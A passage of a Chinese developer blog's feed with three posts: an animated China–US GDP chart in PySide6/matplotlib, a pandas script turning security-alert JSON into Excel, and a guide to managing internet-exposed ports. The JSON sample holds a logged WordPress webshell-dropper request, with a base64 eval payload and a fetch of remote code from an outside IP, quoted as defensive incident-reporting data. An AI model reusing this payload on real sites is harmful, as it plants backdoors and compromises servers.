class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> locale</span><br><span class="line"><span class="keyword">import</span> matplotlib.ticker <span class="keyword">as</span> mticker</span><br><span class="line"><span class="keyword">from</span> PySide6.QtCore <span class="keyword">import</span> Qt, Slot, QTimer</span><br><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QMainWindow, QApplication, QVBoxLayout, QHBoxLayout, QWidget, QSlider, QComboBox</span><br><span class="line"><span class="keyword">from</span> matplotlib.backends.backend_qtagg <span class="keyword">import</span> FigureCanvasQTAgg</span><br><span class="line"><span class="keyword">from</span> matplotlib.figure <span class="keyword">import</span> Figure</span><br><span class="line"></span><br><span class="line">figure = Figure(figsize=(<span class="number">12</span>, <span class="number">6</span>), dpi=<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> cur_data_len, cur_major_locator</span><br><span class="line">cur_data_len = <span class="number">10</span>  <span class="comment"># 当前显示的数据量（显示10年的数据）</span></span><br><span class="line">cur_major_locator = <span class="number">10</span>  <span class="comment"># 当前刻度的定位器（主刻度）</span></span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">'\((\S*)\)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgdpvalue</span><span class="params">(gdpstr)</span>:</span></span><br><span class="line">    re_obj=pattern.search(gdpstr)</span><br><span class="line">    gdp_value=locale.atof(re_obj.group(<span class="number">1</span>))/<span class="number">100000000</span></span><br><span class="line">    <span class="keyword">return</span> gdp_value</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationWindow</span><span class="params">(QMainWindow)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, parent=None,org_data=None)</span>:</span></span><br><span class="line">        QMainWindow.__init__(self, parent)</span><br><span class="line">        self.axes = <span class="literal">None</span></span><br><span class="line">        self.axis_china=<span class="literal">None</span></span><br><span class="line">        self.axis_us=<span class="literal">None</span></span><br><span class="line">        self.datacount=<span class="number">10</span></span><br><span class="line">        self.org_data = org_data</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Central widget</span></span><br><span class="line">        self._main = QWidget()</span><br><span class="line">        self.setCentralWidget(self._main)</span><br><span class="line">        <span class="comment"># Figure</span></span><br><span class="line">        self.canvas = FigureCanvasQTAgg(figure)</span><br><span class="line">        <span class="keyword">if</span> len(self.org_data) &gt; <span class="number">0</span>:</span><br><span class="line">            show_data = self.org_data[<span class="number">0</span>:self.datacount]</span><br><span class="line">            self.axes = self.canvas.figure.subplots()</span><br><span class="line">            self.axes.set_title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">            self.axis_china = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'china_gdp_value'</span>], label=<span class="string">'中国GDP'</span>)</span><br><span class="line">            self.axis_us = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'us_gdp_value'</span>], label=<span class="string">'美国GDP'</span>)</span><br><span class="line">            y_max = max(self.org_data[<span class="string">'us_gdp_value'</span>].max(), self.org_data[<span class="string">'china_gdp_value'</span>].max())</span><br><span class="line">            self.axes.set_ylabel(<span class="string">'GDP(亿元)'</span>)</span><br><span class="line">            self.axes.set_xlabel(<span class="string">'年份'</span>)</span><br><span class="line">            self.axes.set_ylim(<span class="number">0</span>, y_max)</span><br><span class="line">            self.axes.set_xlim(show_data[<span class="string">'年份'</span>].min(), show_data[<span class="string">'年份'</span>].max())</span><br><span class="line">            self.axes.legend(loc=<span class="string">"upper left"</span>)</span><br><span class="line">            self.axes.yaxis.set_major_locator(mticker.MultipleLocator(<span class="number">20000</span>))</span><br><span class="line">            self.axes.xaxis.set_major_locator(mticker.MultipleLocator(<span class="number">1</span>))</span><br><span class="line">            figure.tight_layout()  <span class="comment"># 自动调整子图参数，使之填充整个图像区域</span></span><br><span class="line">        <span class="comment"># 下拉框，选择模式 # ComboBox (combo_type)</span></span><br><span class="line">        self.combo_type = QComboBox()</span><br><span class="line">        self.combo_type.addItems([<span class="string">'自动播放'</span>, <span class="string">'手动播放'</span>])</span><br><span class="line">        <span class="comment"># Sliders</span></span><br><span class="line">        min_value = <span class="number">0</span></span><br><span class="line">        self.max_value = len(self.org_data)-cur_data_len</span><br><span class="line">        self.slider_update = QSlider(minimum=min_value, maximum=self.max_value, orientation=Qt.Horizontal) <span class="comment"># 滑动条</span></span><br><span class="line">        layout1 = QHBoxLayout()</span><br><span class="line">        layout1.addWidget(self.combo_type)</span><br><span class="line">        <span class="comment"># layout</span></span><br><span class="line">        layout2 = QVBoxLayout()</span><br><span class="line">        layout2.addWidget(self.canvas, <span class="number">88</span>)</span><br><span class="line">        layout2.addWidget(self.slider_update)</span><br><span class="line">        <span class="comment"># Main layout</span></span><br><span class="line">        layout = QVBoxLayout(self._main)</span><br><span class="line">        layout.addLayout(layout1)</span><br><span class="line">        layout.addLayout(layout2, <span class="number">100</span>)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line">        <span class="comment"># Signal and Slots connections</span></span><br><span class="line">        self.combo_type.currentTextChanged.connect(self.selecttype)</span><br><span class="line">        self.slider_update.valueChanged.connect(self.update_frequency)</span><br><span class="line">        self.autoslider()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">autoslider</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.setInterval(<span class="number">100</span>) <span class="comment"># 100毫秒更新一次数据</span></span><br><span class="line">        self.timer.timeout.connect(self.autoupdate) <span class="comment">#自动更新数据,每次更新偏移量加1，也就是跳一年的数据</span></span><br><span class="line">        self.timer.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">autoupdate</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.update_frequency(self.auto_offset)</span><br><span class="line">        self.slider_update.setSliderPosition(self.auto_offset)</span><br><span class="line">        <span class="keyword">if</span> self.auto_offset &lt; self.max_value:</span><br><span class="line">            self.auto_offset = self.auto_offset+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.auto_offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @Slot()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selecttype</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'自动播放'</span> == text:</span><br><span class="line">            self.autoslider()</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'手动播放'</span> == text:</span><br><span class="line">            self.timer.stop()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @Slot()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_frequency</span><span class="params">(self, new_val)</span>:</span></span><br><span class="line">        <span class="comment"># 偏移量每次偏移1</span></span><br><span class="line">        f = int(new_val)</span><br><span class="line">        offset = f + cur_data_len  <span class="comment"># 偏移刻度</span></span><br><span class="line">        show_data = self.org_data[f: offset]</span><br><span class="line">        x = show_data[<span class="string">'年份'</span>]</span><br><span class="line">        y_china = show_data[<span class="string">'china_gdp_value'</span>]</span><br><span class="line">        y_us = show_data[<span class="string">'us_gdp_value'</span>]</span><br><span class="line">        self.axes.set_xlim(x.min(), x.max())</span><br><span class="line">        self.axis_china[<span class="number">0</span>].set_data(x, y_china)</span><br><span class="line">        self.axis_us[<span class="number">0</span>].set_data(x, y_us)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    locale.setlocale(locale.LC_ALL, <span class="string">'en_US.UTF-8'</span>)</span><br><span class="line">    df_data = pd.read_excel(<span class="string">'data\中国VS美国.xlsx'</span>)</span><br><span class="line">    df_data = df_data.loc[<span class="number">1</span>:len(df_data)]</span><br><span class="line">    df_data[<span class="string">'china_gdp_value'</span>] = df_data[<span class="string">'中国'</span>].map(getgdpvalue)</span><br><span class="line">    df_data[<span class="string">'us_gdp_value'</span>] = df_data[<span class="string">'美国'</span>].map(getgdpvalue)</span><br><span class="line">    df_data = df_data.sort_values(<span class="string">'年份'</span>)</span><br><span class="line">    w = ApplicationWindow(org_data=df_data)</span><br><span class="line">    w.setFixedSize(<span class="number">1000</span>, <span class="number">500</span>)</span><br><span class="line">    w.show()</span><br><span class="line">    app.exec()</span><br></pre></td></tr></table></figure><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>Python实现matplotlib动态绘图，是非常简单和容易的，其实关键还是在数据的组织，也就是要准备好要绘图的坐标轴的x的数据和y的数据，通过set_data(x,y)来动态更新数据，要注意的是变化的数据后X轴或Y轴的显示要变化，这里可以通过轴的set_xlim()或set_ylim()方法来动态设置，刻度也可通过set_major_locator()来指定。</p><p>数据集见 <a href="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/中国VS美国.xlsx" target="_blank" rel="noopener">https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/中国VS美国.xlsx</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着中国的各种实力的提高，经常在各种媒体上看到中国与各个国家历年的各种指标数据的对比，为了更清楚的展示历年的发展趋势，有的还做成了动图，看到中国各种指标数据的近年的不断逆袭，心中的自豪感油然而生。今天通过Python来实现matplotlib的动态绘图，将中美两国近年的GD
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python三行代码实现json转Excel</title>
    <link href="https://xiejava.gitee.io/posts/213c546f/"/>
    <id>https://xiejava.gitee.io/posts/213c546f/</id>
    <published>2023-08-18T06:33:33.000Z</published>
    <updated>2023-08-18T06:39:21.232Z</updated>
    
    <content type="html"><![CDATA[<p>最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。<br>用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。<br>实现如下：</p><h2 id="一、引包"><a href="#一、引包" class="headerlink" title="一、引包"></a>一、引包</h2><p>引入pandas包，pandas写excel依赖openpyxl包所以也到导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas </span><br><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure><h2 id="二、代码"><a href="#二、代码" class="headerlink" title="二、代码"></a>二、代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">json_data=<span class="string">r'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   "msg": "",</span></span><br><span class="line"><span class="string">   "killChain": "02",</span></span><br><span class="line"><span class="string">   "attackIllustration": "1起恶意盲打木马写入攻击",</span></span><br><span class="line"><span class="string">   "traceSourceFlag": "01",</span></span><br><span class="line"><span class="string">   "riskLevel": "02",</span></span><br><span class="line"><span class="string">   "holeType": "",</span></span><br><span class="line"><span class="string">   "discoveryTime": "2023-08-15 14:36:23",</span></span><br><span class="line"><span class="string">   "disposalMeasure": "01",</span></span><br><span class="line"><span class="string">   "informationSource": "长亭WAF",</span></span><br><span class="line"><span class="string">   "disposalSuggestion": "建议封禁",</span></span><br><span class="line"><span class="string">   "riskLevelPredue": "",</span></span><br><span class="line"><span class="string">   "impactFlag": "02",</span></span><br><span class="line"><span class="string">   "disposalOperateRecord": "WAF封禁",</span></span><br><span class="line"><span class="string">   "serialNo": "ABC123",</span></span><br><span class="line"><span class="string">   "sourceIpBelong": "美国",</span></span><br><span class="line"><span class="string">   "potentialImpact": "无",</span></span><br><span class="line"><span class="string">   "sourceIpType": "04",</span></span><br><span class="line"><span class="string">   "protocalType": "HTTP",</span></span><br><span class="line"><span class="string">   "disposalFlag": "01",</span></span><br><span class="line"><span class="string">   "groupOrderType": "1",</span></span><br><span class="line"><span class="string">   "comment": "通过微步溯源，IP归属地是美国",</span></span><br><span class="line"><span class="string">   "attackDetail": "POST //wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw== HTTP/1.1\n\nHost: abcd.cn\n\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n\nUser-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\n\nAccept-Language: en-US,en;q=0.9,fr;q=0.8\n\nCache-Control: max-age=0\n\nreferer: www.google.com\n\nUpgrade-Insecure-Requests: 1\n\nContent-Length: 231\n\nContent-Type: application/x-www-form-urlencoded\n\n\n\nvz=$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/uploader.php','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo+\"aDriv4\".$x;",</span></span><br><span class="line"><span class="string">   "taskId": "",</span></span><br><span class="line"><span class="string">   "status": ""</span></span><br><span class="line"><span class="string">&#125;'''</span></span><br><span class="line">dic_data = json.loads(json_data,strict=<span class="literal">False</span>)</span><br><span class="line">df_data=pd.DataFrame(dic_data,index=[<span class="number">0</span>])</span><br><span class="line">df_data.to_excel(<span class="string">'attack.xlsx'</span>)</span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230818/json%E8%BD%ACexcel.png" alt="json转excel"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>因为attackDetail字段有很多类似\n等的转义符，会导致json解析不成功，在json.loads的时候就会报错。报类似于<br><code>json.decoder.JSONDecodeError: Expecting &#39;,&#39; delimiter: line 50 column 149 (char 1339)</code>的错误。所以需要在字符串前面加<code>r</code>标识来忽略掉转义机制。</p><p>常见的字符串标识<code>u,r,b,f</code></p><ul><li>字符串前加u<br>后面字符串以 Unicode格式进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li><li>字符串前加r<br>去掉反斜杠的转义机制。（特殊字符：即那些，反斜杠加上对应字母，表示对应的特殊含义的，比如最常见的”\n”表示换行，”\t”表示Tab等。 ）</li><li>字符串前加b<br>b前缀表示：后面字符串是bytes 类型。</li><li>字符串前加f<br>以 f 开头表示在字符串内支持大括号内的python 表达式字符串拼接。<br>如：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">'xiejava'</span></span><br><span class="line">outputstr=<span class="string">f'My name is <span class="subst">&#123;name&#125;</span>'</span></span><br><span class="line">print(outputstr)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is xiejava</span><br></pre></td></tr></table></figure><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。&lt;br&gt;用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。&lt;
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络安全之互联网暴露资产端口</title>
    <link href="https://xiejava.gitee.io/posts/ff84f2fb/"/>
    <id>https://xiejava.gitee.io/posts/ff84f2fb/</id>
    <published>2023-05-15T06:22:32.000Z</published>
    <updated>2023-05-15T06:41:20.144Z</updated>
    
    <content type="html"><![CDATA[<p>互联网暴露资产因直接向公众互联网开放，极易遭受来自外部组织或人员的入侵与攻击，是风险管控的高危区域。</p><p>作为企业的安全管理，互联网暴露资产的管理是非常重要的一环。应该建立规范的流程严控互联网暴露端口的审批，对互联网暴露出口应尽量缩减收敛减少暴露面，对互联网暴露面进行定期的探测及时发现没有被纳管的暴露面资产，对因为业务需要必须要暴露的资产端口进行有效的访问控制策略等。</p><p>本文介绍互联网暴露资产端口的定义、分类及管理。</p><h2 id="互联网暴露资产端口定义"><a href="#互联网暴露资产端口定义" class="headerlink" title="互联网暴露资产端口定义"></a>互联网暴露资产端口定义</h2><p>互联网暴露端口指信息系统资产、网络设备或终端设备面向互联网开放服务或开放协议的端口（含 NAT 映射端口），该端口可被其他互联网的资产进行主动探测、访问或连接。当某资产至少具备一个互联网暴露端口时，则认定该资产为互联网暴露资产；当某信息系统内部至少具备一台互联网暴露资产时，则认定该信息系统为互联网暴露信息系统。<br>当互联网暴露资产同时面向内网（或私网）开放服务或开放协议时，相关端口不属于互联网暴露端口，不纳入互联网暴露端口管控范围；当某资产通过互联网主动发起单向通信时，因该资产用于通信服务的端口并未暴露于互联网，也无法被其他互联网资产主动探测、访问或连接，则认定该资产不属于互联网暴露资产，且不具备互联网暴露端口。<br>互联网暴露端口的判定，与该端口是否已执行访问控制策略不相关。</p><h2 id="互联网暴露资产端口分类"><a href="#互联网暴露资产端口分类" class="headerlink" title="互联网暴露资产端口分类"></a>互联网暴露资产端口分类</h2><p>互联网暴露资产（含信息系统、网络设备、终端）端口按照其功能用途，可分为业务类端口及管理类端口两大类：<br>1）业务类端口。具体可细分为以下三类：</p><ul><li>用户访问端口：主要指各类与用户侧交互的，支撑用户访问服务的端口，如 WEB 访问端口、视频流端口等。</li><li>平台交互端口：系统内外部服务器间的接口交互、数据交互等服务端口。</li><li>路由协议端口：常见于路由设备，用于配置路由协议而开放的端口服务，如 BGP边界网关协议端口、OSPF 开放式最短路径优先协议端口等。</li></ul><p>2）管理类端口。主要包含实现远程操控管理、后台访问运维、用户数据收集及用户终端主动管控等服务的端口。</p><h2 id="互联网暴露资产端口管理"><a href="#互联网暴露资产端口管理" class="headerlink" title="互联网暴露资产端口管理"></a>互联网暴露资产端口管理</h2><ul><li>尽量缩减收敛减少暴露面，基于最小使用原则，对于高危风险端口应严禁对互联网开放，尤其是管理类端口如数据库、运维管理等端口。如mysql的3306端口、Redis的6379端口等。对于必须要暴露的资产端口进行有效管控，如：制定合理的访问控制策略、加强鉴权等。</li><li>应该建立互联网暴露资产台账，规范的流程严控互联网暴露端口的审批，动态维护好互联网暴露资产台账。</li><li>对互联网暴露面进行定期的探测及时发现没有被纳管的暴露面资产，对没有没纳管的暴露面资产进行纳管加强管控或下线，及时维护台账。</li></ul><h3 id="常见的高危风险端口"><a href="#常见的高危风险端口" class="headerlink" title="常见的高危风险端口"></a>常见的高危风险端口</h3><table><thead><tr><th>高危端口号（默认）</th><th>22（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SSH （Secure Shell），安全外壳协议</td></tr><tr><td>应用场景或应用组件</td><td>远程登录、SSH 端口转发</td></tr><tr><td>端口用途说明</td><td>SSH 协议的服务连接端口，可用于进行远程操作维护</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>弱口令、未授权访问、暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>23（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Telnet （ 远程终端协议）</td></tr><tr><td>应用场景或应用组件</td><td>远程登录</td></tr><tr><td>端口用途说明</td><td>Telnet 协议的服务连接端口，可用于进行远程操作维护</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>弱口令、未授权访问、暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>161（UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SNMP（Simple Network Management Protocol，简单网络管理协议）</td></tr><tr><td>端口用途说明</td><td>可用于对网络设备进行远程信息读取、管理和配置</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>爆破默认团队字符串，导致信息泄漏</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>111（TCP/UDP）、2049（TCP/UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>NFS（Network File System），网络文件系统</td></tr><tr><td>端口用途说明</td><td>用于远程文件传输</td></tr><tr><td>端口类别</td><td>业务类端口（用户访问端口、平台交互端口）</td></tr><tr><td>风险描述</td><td>权限配置不当</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>3306（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>MySQL（数据库）</td></tr><tr><td>端口用途说明</td><td>MySQL 是一款开源关系数据库管理系统。该端口端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>6379（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Redis（数据库）</td></tr><tr><td>端口用途说明</td><td>Redis 默认管理和服务端口</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>可能会存在未授权访问，或者进行弱口令爆破；获得访问权限后，可能存在任意文件写入导致获取系统远程控制权限。</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>27017（TCP）、27018（TCP）、27019（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>MongoDB（数据库）</td></tr><tr><td>端口用途说明</td><td>用于 MongoDB 数据库的远程管理和服务，以及集群间通信</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>爆破，未授权访问</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>1433（TCP）、1434（UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SQLServer（数据库）</td></tr><tr><td>端口用途说明</td><td>SQL Server 是 Microsoft 公司推出的关系型数据库管理系统。<br>1433（默认）端口用于数据库远程管理和连接，1434（默认）用于命名服务</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>提权，弱口令，爆破；早期版本还存在远程命令执行漏洞</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>1521（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Oracle（甲骨文数据库）</td></tr><tr><td>端口用途说明</td><td>Oracle 是甲骨文公司的一款关系数据库管理系统。该端口端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>5432（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>PostgreSQL（数据库）</td></tr><tr><td>端口用途说明</td><td>PostgreSQL 是一款开源关系数据库管理系统。该端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>3389（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Windows RDP（远程桌面协议）</td></tr><tr><td>端口用途说明</td><td>用于访问服务器的远程桌面服务，提供基于图形界面的远程操作维护功能。</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>暴力破解，远程控制</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>5800（TCP），5900（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>VNC（Virtual Network Console），虚拟网络控制台</td></tr><tr><td>端口用途说明</td><td>VNC 是一款远程桌面和远程控制软件，5800 和 5900（默认）端口均为 VNC 服务启动端口或远端控制端口</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>暴力破解，远程控制</td></tr></tbody></table><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;互联网暴露资产因直接向公众互联网开放，极易遭受来自外部组织或人员的入侵与攻击，是风险管控的高危区域。&lt;/p&gt;
&lt;p&gt;作为企业的安全管理，互联网暴露资产的管理是非常重要的一环。应该建立规范的流程严控互联网暴露端口的审批，对互联网暴露出口应尽量缩减收敛减少暴露面，对互联网暴露面
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
